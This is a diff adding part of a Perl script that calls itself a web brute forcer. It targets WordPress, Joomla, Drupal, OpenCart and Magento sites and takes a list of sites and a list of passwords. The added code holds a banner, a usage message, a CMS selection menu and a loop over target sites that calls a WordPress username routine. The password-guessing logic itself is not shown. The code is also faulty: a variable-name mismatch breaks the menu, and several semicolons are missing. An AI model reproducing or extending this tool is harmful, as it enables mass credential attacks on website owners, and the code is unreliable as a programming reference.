@@ -28,6 +28,68 @@ unless ($list|$pass) { help(); }
 if ($list|$pass) { webbrute(); }
 
 sub banner() {
-    print color('bold red'), "WEB BRUTE FORCER"
-    print color('bold white'), "FOR WordPress , Joomla , DruPal , OpenCart , Magento"
+    print color('bold red'), "WEB BRUTE FORCER";
+    print color('bold white'), "FOR WordPress , Joomla , DruPal , OpenCart , Magento";
+    print color('reset');
+};
+
+sub help() {
+print q(
+    Usage: perl bruteforcer.pl -l list.txt -p passwords.txt
+
+    options:
+    -l => websits list
+    -p => passwords list
+);
+}
+
+sub bruteforcer{
+print color('bold red')," [";
+print color('bold green'),"1";
+print color('bold red'),"]";
+print color('bold white')," WordPress \n";
+print color('bold red')," [";
+print color('bold green');
+print color('bold green'),"2";
+print color('bold red'),"]";
+print color('bold white')," Joomla \n";
+print color('bold red')," [";
+print color('bold green'),"3";
+print color('bold red'),"]";
+print color('bold white')," DruPal \n";
+print color('bold red')," [";
+print color('bold green'),"4";
+print color('bold red'),"]";
+print color('bold white')," OpenCart \n";
+print color('bold red')," [";
+print color('bold green'),"5";
+print color('bold red'),"]";
+print color('bold white')," Magento \n";
+print color('bold red')," [";
+print color('bold green'),"6";
+print color('bold red'),"]";
+print color('bold white')," Auto \n";
+print color('bold red')," [";
+print color('bold green'),"+";
+print color('bold red'),"]";
+print color('bold white')," Choose Number : ";
+
+my $Number = <STDIN>;
+chomp $number;
+print "\n"
+if($number eq '1')
+{
+    open(THETARGET, "<$list") || die "cant open the file";
+@TARGETS = <THETARGET>;
+close THETARGET;
+$link=$#TARGETS + 1;
+
+OUTER: foreach $site(@TARGETS){
+    chomp($site);
+    print color('bold red'), "\n [";
+    print color('bold green'), "+";
+    print color('bold red'), "] "
+    print color('bold red'),"$site",
+    wpuser();
+}
 }
